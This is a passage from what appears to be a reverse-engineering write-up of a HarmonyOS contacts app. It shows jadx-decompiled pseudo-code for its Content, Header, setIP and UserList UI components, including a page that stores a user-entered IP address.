        obj2 = obj.prototype;
        _module_0_ = obj;
        return null;
    }

    public Object #~@0>@1*^3*#(Object functionObject, Object newTarget, Content this) {
        return null;
    }

    /* JADX WARN: Multi-variable type inference failed */
    /* JADX WARN: Type inference failed for: r16v0, types: [&entry/src/main/ets/components/Content&] */
    /* JADX WARN: Type inference failed for: r23v34, types: [int] */
    public Object #~@0=#Content(Object functionObject, Object newTarget, Content this, Object arg0, Object arg1, Object arg2, Object arg3, Object arg4, Object arg5) {
        obj = arg3;
        obj2 = arg4;
        if ((0 == obj ? 1 : 0) != 0) {
            obj = -1;
        }
        if ((0 == obj2 ? 1 : 0) != 0) {
            obj2 = null;
        }
        obj3 = super(arg0, arg2, obj, arg5);
        if (("function" == typeof(obj2) ? 1 : 0) != 0) {
            obj3.paramsGenerator_ = obj2;
        }
        obj3.setInitiallyProvidedValue(arg1);
        obj3.finalizeConstruction();
        return obj3;
    }

    public Object #~@0>#rerender(Object functionObject, Object newTarget, Content this) {
        this.updateDirtyElements();
        return null;
    }

    public Object #~@0>#initialRender(Object functionObject, Object newTarget, Content this) {
        newlexenvwithname([2, "4newTarget", 0, "this", 1], 2);
        _lexenv_0_0_ = newTarget;
        _lexenv_0_1_ = this;
        ldlexvar = _lexenv_0_1_;
        ldlexvar.observeComponentCreation2(#~@0>@1*#, Column);
        ldlexvar2 = _lexenv_0_1_;
        ldlexvar2.observeComponentCreation2(#~@0>@1*#^1, GridRow);
        ldlexvar3 = _lexenv_0_1_;
        ldlexvar3.observeComponentCreation2(#~@0>@1*#^2, GridCol);
        ldlexvar4 = _lexenv_0_1_;
        ldlexvar4.observeComponentCreation2(#~@0>@1*#^3, createobjectwithbuffer(["name", "UserList"]));
        GridCol.pop();
        GridRow.pop();
        ldlexvar5 = _lexenv_0_1_;
        ldlexvar5.observeComponentCreation2(#~@0>@1*#^4, Text);
        Text.pop();
        Column.pop();
        return null;
    }

    public Object #~@0>#updateStateVars(Object functionObject, Object newTarget, Content this, Object arg0) {
        return null;
    }

    public Object #~@0>#aboutToBeDeleted(Object functionObject, Object newTarget, Content this) {
        Get = SubscriberManager.Get();
        Get.delete(this.id__());
        this.aboutToBeDeletedInternal();
        return null;
    }

    public Object #~@0>@1*^3*#paramsLambda(Object functionObject, Object newTarget, Content this) {
        return createemptyobject();
    }

    public Object #~@0>#setInitiallyProvidedValue(Object functionObject, Object newTarget, Content this, Object arg0) {
        return null;
    }

    public Object #~@0>#purgeVariableDependenciesOnElmtId(Object functionObject, Object newTarget, Content this, Object arg0) {
        return null;
    }
}
```

```java
package p001entry/src/main/ets/components;

/* renamed from: &entry/src/main/ets/components/Header&, reason: invalid class name */
/* loaded from: F:\Download\contacts.hap\contacts\ets\modules.abc */
public class Header {
    public Object pkgName@entry;
    public Object isCommonjs;
    public Object hasTopLevelAwait;
    public Object isSharedModule;
    public Object scopeNames;
    public Object moduleRecordIdx;

    public Object #*#(Object functionObject, Object newTarget, Header this) {
        return null;
    }

    public Object #~@0>@1*#(Object functionObject, Object newTarget, Header this, Object arg0, Object arg1) {
        Row.create();
        Row.width(import { StyleConstants } from "@normalized:N&&&entry/src/main/ets/common/constants/StyleConstants&".FULL_WIDTH);
        obj = Row.height;
        obj2 = createobjectwithbuffer(["id", 16777326, "type", 10002, "params", 0, "bundleName", "com.example.myapplication", "moduleName", "entry"]);
        obj2.params = [Object];
        obj(obj2);
        Row.zIndex(import { HeaderConstants } from "@normalized:N&&&entry/src/main/ets/common/constants/HeaderConstants&".Z_INDEX);
        return null;
    }

    public Object #~@0>@1*#^1(Object functionObject, Object newTarget, Header this, Object arg0, Object arg1) {
        obj = Text.create;
        obj2 = createobjectwithbuffer(["id", 16777236, "type", 10003, "params", 0, "bundleName", "com.example.myapplication", "moduleName", "entry"]);
        obj2.params = [Object];
        obj(obj2);
        Text.fontWeight(import { HeaderConstants } from "@normalized:N&&&entry/src/main/ets/common/constants/HeaderConstants&".TITLE_FONT_WEIGHT);
        obj3 = Text.fontColor;
        obj4 = createobjectwithbuffer(["id", 16777245, "type", 10001, "params", 0, "bundleName", "com.example.myapplication", "moduleName", "entry"]);
        obj4.params = [Object];
        obj3(obj4);
        obj5 = Text.opacity;
        obj6 = createobjectwithbuffer(["id", 16777327, "type", 10002, "params", 0, "bundleName", "com.example.myapplication", "moduleName", "entry"]);
        obj6.params = [Object];
        obj5(obj6);
        Text.letterSpacing(import { HeaderConstants } from "@normalized:N&&&entry/src/main/ets/common/constants/HeaderConstants&".LETTER_SPACING);
        obj7 = Text.padding;
        obj8 = createobjectwithbuffer(["left", 0]);
        obj9 = createobjectwithbuffer(["id", 16777328, "type", 10002, "params", 0, "bundleName", "com.example.myapplication", "moduleName", "entry"]);
        obj9.params = [Object];
        obj8.left = obj9;
        obj7(obj8);
        Text.fontSize("20vp");
        return null;
    }

    public Object #~@0>@1*#^2(Object functionObject, Object newTarget, Header this, Object arg0, Object arg1) {
        Blank.create();
        return null;
    }

    public Object #~@0>@1*#^3(Object functionObject, Object newTarget, Header this, Object arg0, Object arg1) {
        obj = Text.create;
        obj2 = createobjectwithbuffer(["id", 16777234, "type", 10003, "params", 0, "bundleName", "com.example.myapplication", "moduleName", "entry"]);
        obj2.params = [Object];
        obj(obj2);
        Text.fontWeight(import { HeaderConstants } from "@normalized:N&&&entry/src/main/ets/common/constants/HeaderConstants&".TITLE_FONT_WEIGHT);
        obj3 = Text.fontColor;
        obj4 = createobjectwithbuffer(["id", 16777245, "type", 10001, "params", 0, "bundleName", "com.example.myapplication", "moduleName", "entry"]);
        obj4.params = [Object];
        obj3(obj4);
        obj5 = Text.opacity;
        obj6 = createobjectwithbuffer(["id", 16777327, "type", 10002, "params", 0, "bundleName", "com.example.myapplication", "moduleName", "entry"]);
        obj6.params = [Object];
        obj5(obj6);
        Text.letterSpacing(import { HeaderConstants } from "@normalized:N&&&entry/src/main/ets/common/constants/HeaderConstants&".LETTER_SPACING);
        obj7 = Text.padding;
        obj8 = createobjectwithbuffer(["left", 0]);
        obj9 = createobjectwithbuffer(["id", 16777328, "type", 10002, "params", 0, "bundleName", "com.example.myapplication", "moduleName", "entry"]);
        obj9.params = [Object];
        obj8.left = obj9;
        obj7(obj8);
        Text.onClick(#~@0>@1*^3*#);
        Text.fontSize("20vp");
        return null;
    }

    /* JADX WARN: Type inference failed for: r13v7, types: [boolean, int] */
    public Object func_main_0(Object functionObject, Object newTarget, Header this) {
        newlexenvwithname([2, "4newTarget", 0, "this", 1], 2);
        _lexenv_0_0_ = newTarget;
        _lexenv_0_1_ = this;
        if (isIn("finalizeConstruction", ViewPU.prototype) == false) {
            Reflect.set(ViewPU.prototype, "finalizeConstruction", #*#);
        }
        obj = ViewPU.#~@0=#Header(Object2, Object3, ViewPU, ["setInitiallyProvidedValue", "&entry/src/main/ets/components/Header&.#~@0>#setInitiallyProvidedValue", 1, "updateStateVars", "&entry/src/main/ets/components/Header&.#~@0>#updateStateVars", 1, "purgeVariableDependenciesOnElmtId", "&entry/src/main/ets/components/Header&.#~@0>#purgeVariableDependenciesOnElmtId", 1, "aboutToBeDeleted", "&entry/src/main/ets/components/Header&.#~@0>#aboutToBeDeleted", 0, "initialRender", "&entry/src/main/ets/components/Header&.#~@0>#initialRender", 0, "rerender", "&entry/src/main/ets/components/Header&.#~@0>#rerender", 0, 6]);
        obj2 = obj.prototype;
        _module_0_ = obj;
        return null;
    }

    /* JADX WARN: Multi-variable type inference failed */
    /* JADX WARN: Type inference failed for: r16v0, types: [&entry/src/main/ets/components/Header&] */
    /* JADX WARN: Type inference failed for: r23v34, types: [int] */
    public Object #~@0=#Header(Object functionObject, Object newTarget, Header this, Object arg0, Object arg1, Object arg2, Object arg3, Object arg4, Object arg5) {
        obj = arg3;
        obj2 = arg4;
        if ((0 == obj ? 1 : 0) != 0) {
            obj = -1;
        }
        if ((0 == obj2 ? 1 : 0) != 0) {
            obj2 = null;
        }
        obj3 = super(arg0, arg2, obj, arg5);
        if (("function" == typeof(obj2) ? 1 : 0) != 0) {
            obj3.paramsGenerator_ = obj2;
        }
        obj3.setInitiallyProvidedValue(arg1);
        obj3.finalizeConstruction();
        return obj3;
    }

    public Object #~@0>@1*^3*#(Object functionObject, Object newTarget, Header this) {
        router = import { default as router } from "@ohos:router";
        pushUrl = router.pushUrl(createobjectwithbuffer(["url", "pages/setIP"]));
        pushUrl.catch(#~@0>@1*^3**#);
        return null;
    }

    public Object #~@0>@1*^3**#(Object functionObject, Object newTarget, Header this, Object arg0) {
        return null;
    }

    public Object #~@0>#rerender(Object functionObject, Object newTarget, Header this) {
        this.updateDirtyElements();
        return null;
    }

    public Object #~@0>#initialRender(Object functionObject, Object newTarget, Header this) {
        newlexenvwithname([2, "4newTarget", 0, "this", 1], 2);
        _lexenv_0_0_ = newTarget;
        _lexenv_0_1_ = this;
        ldlexvar = _lexenv_0_1_;
        ldlexvar.observeComponentCreation2(#~@0>@1*#, Row);
        ldlexvar2 = _lexenv_0_1_;
        ldlexvar2.observeComponentCreation2(#~@0>@1*#^1, Text);
        Text.pop();
        ldlexvar3 = _lexenv_0_1_;
        ldlexvar3.observeComponentCreation2(#~@0>@1*#^2, Blank);
        Blank.pop();
        ldlexvar4 = _lexenv_0_1_;
        ldlexvar4.observeComponentCreation2(#~@0>@1*#^3, Text);
        Text.pop();
        Row.pop();
        return null;
    }

    public Object #~@0>#updateStateVars(Object functionObject, Object newTarget, Header this, Object arg0) {
        return null;
    }

    public Object #~@0>#aboutToBeDeleted(Object functionObject, Object newTarget, Header this) {
        Get = SubscriberManager.Get();
        Get.delete(this.id__());
        this.aboutToBeDeletedInternal();
        return null;
    }

    public Object #~@0>#setInitiallyProvidedValue(Object functionObject, Object newTarget, Header this, Object arg0) {
        return null;
    }

    public Object #~@0>#purgeVariableDependenciesOnElmtId(Object functionObject, Object newTarget, Header this, Object arg0) {
        return null;
    }
}
```

继续去看`setIP`和`Userlist`

```java
package p001entry/src/main/ets/pages;

/* renamed from: &entry/src/main/ets/pages/setIP&, reason: invalid class name */
/* loaded from: F:\Download\contacts.hap\contacts\ets\modules.abc */
public class setIP {
    public Object pkgName@entry;
    public Object isCommonjs;
    public Object hasTopLevelAwait;
    public Object isSharedModule;
    public Object scopeNames;
    public Object moduleRecordIdx;

    public Object #*#(Object functionObject, Object newTarget, setIP this) {
        return null;
    }

    /* JADX WARN: Type inference failed for: r10v0, types: [java.lang.Class] */
    public Object #*#^1(Object functionObject, Object newTarget, setIP this) {
        return _lexenv_0_1_(null, createemptyobject());
    }

    public Object #~@0>@1*#(Object functionObject, Object newTarget, setIP this, Object arg0, Object arg1) {
        TextInput.create(createobjectwithbuffer(["placeholder", "请输入IP"]));
        TextInput.inputFilter("[0-9.:]", #~@0>@1**#);
        TextInput.onChange(#~@0>@1**#^1);
        return null;
    }

    public Object #~@2>@1*#(Object functionObject, Object newTarget, setIP this, Object arg0, Object arg1) {
        RelativeContainer.create();
        RelativeContainer.height("100%");
        RelativeContainer.width("100%");
        return null;
    }

    /* JADX WARN: Multi-variable type inference failed */
    public Object #~@0>@1**#(Object functionObject, Object newTarget, setIP this, Object arg0) {
        promptAction = import { default as promptAction } from "@ohos:promptAction";
        obj = promptAction.showToast;
        obj2 = createobjectwithbuffer(["message", 0]);
        obj2.message = arg0 + "非正确ip格式内容";
        obj(obj2);
        return null;
    }

    /* JADX WARN: Multi-variable type inference failed */
    /* JADX WARN: Type inference failed for: r17v0, types: [&entry/src/main/ets/pages/setIP&] */
    /* JADX WARN: Type inference failed for: r24v40, types: [int] */
    public Object #~@2=#setIP(Object functionObject, Object newTarget, setIP this, Object arg0, Object arg1, Object arg2, Object arg3, Object arg4, Object arg5) {
        obj = arg3;
        obj2 = arg4;
        if ((0 == obj ? 1 : 0) != 0) {
            obj = -1;
        }
        if ((0 == obj2 ? 1 : 0) != 0) {
            obj2 = null;
        }
        obj3 = super(arg0, arg2, obj, arg5);
        if (("function" == typeof(obj2) ? 1 : 0) != 0) {
            obj3.paramsGenerator_ = obj2;
        }
        obj3.__inputIP = ObservedPropertySimplePU("", obj3, "inputIP");
        obj3.setInitiallyProvidedValue(arg1);
        obj3.finalizeConstruction();
        return obj3;
    }

    public Object #~@2>@1*#^1(Object functionObject, Object newTarget, setIP this, Object arg0, Object arg1) {
        Row.create();
        Row.width(import { StyleConstants } from "@normalized:N&&&entry/src/main/ets/common/constants/StyleConstants&".FULL_WIDTH);
        obj = Row.height;
        obj2 = createobjectwithbuffer(["id", 16777326, "type", 10002, "params", 0, "bundleName", "com.example.myapplication", "moduleName", "entry"]);
        obj2.params = [Object];
        obj(obj2);
        Row.zIndex(import { HeaderConstants } from "@normalized:N&&&entry/src/main/ets/common/constants/HeaderConstants&".Z_INDEX);
        return null;
    }

    public Object #~@2>@1*#^2(Object functionObject, Object newTarget, setIP this, Object arg0, Object arg1) {
        obj = Image.create;
        obj2 = createobjectwithbuffer(["id", 16777332, "type", 20000, "params", 0, "bundleName", "com.example.myapplication", "moduleName", "entry"]);
        obj2.params = [Object];
        obj(obj2);
        obj3 = Image.width;
        obj4 = createobjectwithbuffer(["id", 16777272, "type", 10002, "params", 0, "bundleName", "com.example.myapplication", "moduleName", "entry"]);
        obj4.params = [Object];
        obj3(obj4);
        obj5 = Image.height;
        obj6 = createobjectwithbuffer(["id", 16777270, "type", 10002, "params", 0, "bundleName", "com.example.myapplication", "moduleName", "entry"]);
        obj6.params = [Object];
        obj5(obj6);
        obj7 = Image.margin;
        obj8 = createobjectwithbuffer(["left", 0]);
        obj9 = createobjectwithbuffer(["id", 16777271, "type", 10002, "params", 0, "bundleName", "com.example.myapplication", "moduleName", "entry"]);
        obj9.params = [Object];
        obj8.left = obj9;
        obj7(obj8);
        Image.onClick(#~@2>@1*^2*#);
        return null;
    }

    public Object #~@2>@1*#^3(Object functionObject, Object newTarget, setIP this, Object arg0, Object arg1) {
        obj = Text.create;
        obj2 = createobjectwithbuffer(["id", 16777224, "type", 10003, "params", 0, "bundleName", "com.example.myapplication", "moduleName", "entry"]);
        obj2.params = [Object];
        obj(obj2);
        Text.fontWeight(import { HeaderConstants } from "@normalized:N&&&entry/src/main/ets/common/constants/HeaderConstants&".TITLE_FONT_WEIGHT);
        obj3 = Text.fontColor;
        obj4 = createobjectwithbuffer(["id", 16777245, "type", 10001, "params", 0, "bundleName", "com.example.myapplication", "moduleName", "entry"]);
        obj4.params = [Object];
        obj3(obj4);
        obj5 = Text.opacity;
        obj6 = createobjectwithbuffer(["id", 16777327, "type", 10002, "params", 0, "bundleName", "com.example.myapplication", "moduleName", "entry"]);
        obj6.params = [Object];
        obj5(obj6);
        return null;
    }

    public Object #~@2>@1*#^4(Object functionObject, Object newTarget, setIP this, Object arg0, Object arg1) {
        Column.create();
        obj = Column.alignRules;
        obj2 = createobjectwithbuffer(["center", 0, "middle", 0]);
        obj3 = createobjectwithbuffer(["anchor", "__container__", "align", 0]);
        obj3.align = VerticalAlign.Center;
        obj2.center = obj3;
        obj4 = createobjectwithbuffer(["anchor", "__container__", "align", 0]);
        obj4.align = HorizontalAlign.Center;
        obj2.middle = obj4;
        obj(obj2);
        return null;
    }

    /* JADX WARN: Multi-variable type inference failed */
    /* JADX WARN: Type inference failed for: r21v10, types: [java.lang.Class] */
    public Object #~@2>@1*#^5(Object functionObject, Object newTarget, setIP this, Object arg0, Object arg1) {
        if (isfalse(arg1) != null) {
            ldlexvar = _lexenv_0_1_;
            ldlexvar.updateStateVarsOfChildByElmtId(arg0, createemptyobject());
            return null;
        }
        ldlexvar2 = _lexenv_1_0_;
        ldlexvar3 = _lexenv_0_1_;
        obj = createobjectwithbuffer(["onTextChange", 0]);
        obj.onTextChange = #~@2>@1*^5*#onTextChange;
        newobjrange = ldlexvar2(ldlexvar3, obj, null, arg0, #~@2>@1*^5*#, createobjectwithbuffer(["page", "entry/src/main/ets/pages/setIP.ets", "line", 47, "col", 11]));
        ViewPU.create(newobjrange);
        newobjrange.paramsGenerator_ = #~@2>@1*^5*#paramsLambda;
        return null;
    }

    public Object #~@2>@1*#^6(Object functionObject, Object newTarget, setIP this, Object arg0, Object arg1) {
        Button.createWithLabel("确认");
        Button.fontWeight(import { HeaderConstants } from "@normalized:N&&&entry/src/main/ets/common/constants/HeaderConstants&".TITLE_FONT_WEIGHT);
        obj = Button.fontColor;
        obj2 = createobjectwithbuffer(["id", 16777245, "type", 10001, "params", 0, "bundleName", "com.example.myapplication", "moduleName", "entry"]);
        obj2.params = [Object];
        obj(obj2);
        obj3 = Button.opacity;
        obj4 = createobjectwithbuffer(["id", 16777327, "type", 10002, "params", 0, "bundleName", "com.example.myapplication", "moduleName", "entry"]);
        obj4.params = [Object];
        obj3(obj4);
        Button.onClick(#~@2>@1*^6*#);
        return null;
    }

    /* JADX WARN: Type inference failed for: r16v7, types: [boolean, int] */
    public Object func_main_0(Object functionObject, Object newTarget, setIP this) {
        newlexenvwithname([4, "ipSetComponent", 0, "setIP", 1, "4newTarget", 2, "this", 3], 4);
        _lexenv_0_2_ = newTarget;
        _lexenv_0_3_ = this;
        if (isIn("finalizeConstruction", ViewPU.prototype) == false) {
            Reflect.set(ViewPU.prototype, "finalizeConstruction", #*#);
        }
        obj = ViewPU.#~@0=#ipSetComponent(Object2, Object3, ViewPU, ["setInitiallyProvidedValue", "&entry/src/main/ets/pages/setIP&.#~@0>#setInitiallyProvidedValue", 1, "updateStateVars", "&entry/src/main/ets/pages/setIP&.#~@0>#updateStateVars", 1, "purgeVariableDependenciesOnElmtId", "&entry/src/main/ets/pages/setIP&.#~@0>#purgeVariableDependenciesOnElmtId", 1, "aboutToBeDeleted", "&entry/src/main/ets/pages/setIP&.#~@0>#aboutToBeDeleted", 0, "initialRender", "&entry/src/main/ets/pages/setIP&.#~@0>#initialRender", 0, "rerender", "&entry/src/main/ets/pages/setIP&.#~@0>#rerender", 0, 6]);
        obj2 = obj.prototype;
        _lexenv_0_0_ = obj;
        obj3 = ViewPU.#~@2=#setIP(Object2, Object3, ViewPU, ["setInitiallyProvidedValue", "&entry/src/main/ets/pages/setIP&.#~@2>#setInitiallyProvidedValue", 1, "updateStateVars", "&entry/src/main/ets/pages/setIP&.#~@2>#updateStateVars", 1, "purgeVariableDependenciesOnElmtId", "&entry/src/main/ets/pages/setIP&.#~@2>#purgeVariableDependenciesOnElmtId", 1, "aboutToBeDeleted", "&entry/src/main/ets/pages/setIP&.#~@2>#aboutToBeDeleted", 0, 4]);
        obj4 = obj3.prototype;
        obj4["inputIP"].getter = obj4.#~@2>#inputIP;
        obj4["inputIP"].setter = obj4.#~@2>#inputIP^1;
        obj4.initialRender = obj4.#~@2>#initialRender;
        obj4.rerender = obj4.#~@2>#rerender;
        obj3.getEntryName = obj3.#~@2<#getEntryName;
        _lexenv_0_1_ = obj3;
        registerNamedRoute(#*#^1, "", createobjectwithbuffer(["bundleName", "com.example.myapplication", "moduleName", "entry", "pagePath", "pages/setIP", "pageFullPath", "entry/src/main/ets/pages/setIP", "integratedHsp", "false", "moduleType", "followWithHap"]));
        return null;
    }

    /* JADX WARN: Type inference failed for: r12v2, types: [Object, int] */
    public Object #~@0>@1**#^1(Object functionObject, Object newTarget, setIP this, Object arg0) {
        if (isfalse(_lexenv_0_1_.onTextChange) != null) {
            return null;
        }
        ldlexvar = _lexenv_0_1_;
        ldlexvar.onTextChange(arg0);
        return null;
    }

    public Object #~@2>@1*^2*#(Object functionObject, Object newTarget, setIP this) {
        router = import { default as router } from "@ohos:router";
        router.back();
        return null;
    }

    public Object #~@2>@1*^5*#(Object functionObject, Object newTarget, setIP this) {
        return null;
    }

    public Object #~@2>@1*^6*#(Object functionObject, Object newTarget, setIP this) {
        global.ip = _lexenv_0_1_.inputIP;
        return null;
    }

    public Object #~@2>#inputIP(Object functionObject, Object newTarget, setIP this) {
        obj = this.__inputIP;
        return obj.get();
    }

    public Object #~@0>#rerender(Object functionObject, Object newTarget, setIP this) {
        this.updateDirtyElements();
        return null;
    }

    public Object #~@2>#rerender(Object functionObject, Object newTarget, setIP this) {
        this.updateDirtyElements();
        return null;
    }

    public Object #~@2>#inputIP^1(Object functionObject, Object newTarget, setIP this, Object arg0) {
        obj = this.__inputIP;
        obj.set(arg0);
        return null;
    }

    public Object #~@2<#getEntryName(Object functionObject, Object newTarget, setIP this) {
        return "setIP";
    }

    public Object #~@0>#initialRender(Object functionObject, Object newTarget, setIP this) {
        newlexenvwithname([2, "4newTarget", 0, "this", 1], 2);
        _lexenv_0_0_ = newTarget;
        _lexenv_0_1_ = this;
        ldlexvar = _lexenv_0_1_;
        ldlexvar.observeComponentCreation2(#~@0>@1*#, TextInput);
        return null;
    }

    public Object #~@2>#initialRender(Object functionObject, Object newTarget, setIP this) {
        newlexenvwithname([2, "4newTarget", 0, "this", 1], 2);
        _lexenv_0_0_ = newTarget;
        _lexenv_0_1_ = this;
        ldlexvar = _lexenv_0_1_;
        ldlexvar.observeComponentCreation2(#~@2>@1*#, RelativeContainer);
        ldlexvar2 = _lexenv_0_1_;
        ldlexvar2.observeComponentCreation2(#~@2>@1*#^1, Row);
        ldlexvar3 = _lexenv_0_1_;
        ldlexvar3.observeComponentCreation2(#~@2>@1*#^2, Image);
        ldlexvar4 = _lexenv_0_1_;
        ldlexvar4.observeComponentCreation2(#~@2>@1*#^3, Text);
        Text.pop();
        Row.pop();
        ldlexvar5 = _lexenv_0_1_;
        ldlexvar5.observeComponentCreation2(#~@2>@1*#^4, Column);
        ldlexvar6 = _lexenv_0_1_;
        ldlexvar6.observeComponentCreation2(#~@2>@1*#^5, createobjectwithbuffer(["name", "ipSetComponent"]));
        ldlexvar7 = _lexenv_0_1_;
        ldlexvar7.observeComponentCreation2(#~@2>@1*#^6, Button);
        Button.pop();
        Column.pop();
        RelativeContainer.pop();
        return null;
    }

    /* JADX WARN: Multi-variable type inference failed */
    /* JADX WARN: Type inference failed for: r16v0, types: [&entry/src/main/ets/pages/setIP&] */
    /* JADX WARN: Type inference failed for: r23v36, types: [int] */
    public Object #~@0=#ipSetComponent(Object functionObject, Object newTarget, setIP this, Object arg0, Object arg1, Object arg2, Object arg3, Object arg4, Object arg5) {
        obj = arg3;
        obj2 = arg4;
        if ((0 == obj ? 1 : 0) != 0) {
            obj = -1;
        }
        if ((0 == obj2 ? 1 : 0) != 0) {
            obj2 = null;
        }
        obj3 = super(arg0, arg2, obj, arg5);
        if (("function" == typeof(obj2) ? 1 : 0) != 0) {
            obj3.paramsGenerator_ = obj2;
        }
        obj3.onTextChange = 0;
        obj3.setInitiallyProvidedValue(arg1);
        obj3.finalizeConstruction();
        return obj3;
    }

    public Object #~@0>#updateStateVars(Object functionObject, Object newTarget, setIP this, Object arg0) {
        return null;
    }

    public Object #~@2>#updateStateVars(Object functionObject, Object newTarget, setIP this, Object arg0) {
        return null;
    }

    public Object #~@0>#aboutToBeDeleted(Object functionObject, Object newTarget, setIP this) {
        Get = SubscriberManager.Get();
        Get.delete(this.id__());
        this.aboutToBeDeletedInternal();
        return null;
    }

    public Object #~@2>#aboutToBeDeleted(Object functionObject, Object newTarget, setIP this) {
        obj = this.__inputIP;
        obj.aboutToBeDeleted();
        Get = SubscriberManager.Get();
        Get.delete(this.id__());
        this.aboutToBeDeletedInternal();
        return null;
    }

    public Object #~@2>@1*^5*#onTextChange(Object functionObject, Object newTarget, setIP this, Object arg0) {
        _lexenv_0_1_.inputIP = arg0;
        return null;
    }

    public Object #~@2>@1*^5*#paramsLambda(Object functionObject, Object newTarget, setIP this) {
        obj = createobjectwithbuffer(["onTextChange", 0]);
        obj.onTextChange = #~@2>@1*^5*@3*#onTextChange;
        return obj;
    }

    public Object #~@2>@1*^5*@3*#onTextChange(Object functionObject, Object newTarget, setIP this, Object arg0) {
        _lexenv_0_1_.inputIP = arg0;
        return null;
    }

    public Object #~@0>#setInitiallyProvidedValue(Object functionObject, Object newTarget, setIP this, Object arg0) {
        if ((0 != arg0.onTextChange ? 1 : 0) == 0) {
            return null;
        }
        this.onTextChange = arg0.onTextChange;
        return null;
    }

    public Object #~@2>#setInitiallyProvidedValue(Object functionObject, Object newTarget, setIP this, Object arg0) {
        if ((0 != arg0.inputIP ? 1 : 0) == 0) {
            return null;
        }
        this.inputIP = arg0.inputIP;
        return null;
    }

    public Object #~@0>#purgeVariableDependenciesOnElmtId(Object functionObject, Object newTarget, setIP this, Object arg0) {
        return null;
    }

    public Object #~@2>#purgeVariableDependenciesOnElmtId(Object functionObject, Object newTarget, setIP this, Object arg0) {
        obj = this.__inputIP;
        obj.purgeDependencyOnElmtId(arg0);
        return null;
    }
}
```

```java
package p001entry/src/main/ets/components;

/* renamed from: &entry/src/main/ets/components/UserList&, reason: invalid class name */
/* loaded from: F:\Download\contacts.hap\contacts\ets\modules.abc */
public class UserList {
    public Object pkgName@entry;
    public Object isCommonjs;
    public Object hasTopLevelAwait;
    public Object isSharedModule;
    public Object scopeNames;
    public Object moduleRecordIdx;

    public Object #*#(Object functionObject, Object newTarget, UserList this) {
        return null;
    }

    public Object #~@0>@1*#(Object functionObject, Object newTarget, UserList this, Object arg0, Object arg1) {
        Row.create();
        obj = Row.height;
        obj2 = createobjectwithbuffer(["id", 16777291, "type", 10002, "params", 0, "bundleName", "com.example.myapplication", "moduleName", "entry"]);
        obj2.params = [Object];
        obj(obj2);
        Row.width(import { StyleConstants } from "@normalized:N&&&entry/src/main/ets/common/constants/StyleConstants&".FULL_WIDTH);
        return null;
    }

    public Object #~@0>@2*#(Object functionObject, Object newTarget, UserList this, Object arg0, Object arg1) {
        Column.create();
        obj = Column.padding;
        obj2 = createobjectwithbuffer(["bottom", 0]);
        obj3 = createobjectwithbuffer(["id", 16777286, "type", 10002, "params", 0, "bundleName", "com.example.myapplication", "moduleName", "entry"]);
        obj3.params = [Object];
        obj2.bottom = obj3;
        obj(obj2);
        return null;
    }

    public Object #~@0>@1*#^1(Object functionObject, Object newTarget, UserList this, Object arg0, Object arg1) {
        obj = Image.create;
        obj2 = createobjectwithbuffer(["id", 16777232, "type", 20000, "params", 0, "bundleName", "com.example.myapplication", "moduleName", "entry"]);
        obj2.params = [Object];
        obj(obj2);
        Image.width("25vp");
        obj3 = Image.height;
        obj4 = createobjectwithbuffer(["id", 16777270, "type", 10002, "params", 0, "bundleName", "com.example.myapplication", "moduleName", "entry"]);
        obj4.params = [Object];
        obj3(obj4);
        obj5 = Image.margin;
        obj6 = createobjectwithbuffer(["left", 0]);
        obj7 = createobjectwithbuffer(["id", 16777271, "type", 10002, "params", 0, "bundleName", "com.example.myapplication", "moduleName", "entry"]);
        obj7.params = [Object];
        obj6.left = obj7;
        obj5(obj6);
        return null;
    }

    public Object #~@0>@1*#^2(Object functionObject, Object newTarget, UserList this, Object arg0, Object arg1) {
        Column.create();
        Column.alignItems(HorizontalAlign.Start);
        return null;
    }

    public Object #~@0>@1*#^3(Object functionObject, Object newTarget, UserList this, Object arg0, Object arg1) {
        obj = Text.create;
        utils = import { default as utils } from "@normalized:N&&&entry/src/main/ets/common/Utils/utils&";
        obj(utils.o0O0OOoo(_lexenv_0_0_.uid));
        Text.fontColor(Color.Black);
        obj2 = Text.margin;
        obj3 = createobjectwithbuffer(["bottom", 0]);
        obj4 = createobjectwithbuffer(["id", 16777295, "type", 10002, "params", 0, "bundleName", "com.example.myapplication", "moduleName", "entry"]);
        obj4.params = [Object];
        obj3.bottom = obj4;
        obj2(obj3);
        return null;
    }

    public Object #~@0>@2*#^1(Object functionObject, Object newTarget, UserList this, Object arg0, Object arg1) {
        List.create();
        List.width(import { StyleConstants } from "@normalized:N&&&entry/src/main/ets/common/constants/StyleConstants&".FULL_WIDTH);
        List.backgroundColor(Color.White);
        obj = List.margin;
        obj2 = createobjectwithbuffer(["top", 0]);
        obj3 = createobjectwithbuffer(["id", 16777285, "type", 10002, "params", 0, "bundleName", "com.example.myapplication", "moduleName", "entry"]);
        obj3.params = [Object];
        obj2.top = obj3;
        obj(obj2);
        List.layoutWeight(1);
        obj4 = List.divider;
        obj5 = createobjectwithbuffer(["color", 0, "strokeWidth", 0, "startMargin", 0, "endMargin", 0]);
        obj6 = createobjectwithbuffer(["id", 16777239, "type", 10001, "params", 0, "bundleName", "com.example.myapplication", "moduleName", "entry"]);
        obj6.params = [Object];
        obj5.color = obj6;
        obj7 = createobjectwithbuffer(["id", 16777325, "type", 10002, "params", 0, "bundleName", "com.example.myapplication", "moduleName", "entry"]);
        obj7.params = [Object];
        obj5.strokeWidth = obj7;
        obj8 = createobjectwithbuffer(["id", 16777294, "type", 10002, "params", 0, "bundleName", "com.example.myapplication", "moduleName", "entry"]);
        obj8.params = [Object];
        obj5.startMargin = obj8;
        obj9 = createobjectwithbuffer(["id", 16777294, "type", 10002, "params", 0, "bundleName", "com.example.myapplication", "moduleName", "entry"]);
        obj9.params = [Object];
        obj5.endMargin = obj9;
        obj4(obj5);
        return null;
    }

    /* JADX WARN: Type inference failed for: r15v7, types: [boolean, int] */
    public Object func_main_0(Object functionObject, Object newTarget, UserList this) {
        newlexenvwithname([2, "4newTarget", 0, "this", 1], 2);
        _lexenv_0_0_ = newTarget;
        _lexenv_0_1_ = this;
        if (isIn("finalizeConstruction", ViewPU.prototype) == false) {
            Reflect.set(ViewPU.prototype, "finalizeConstruction", #*#);
        }
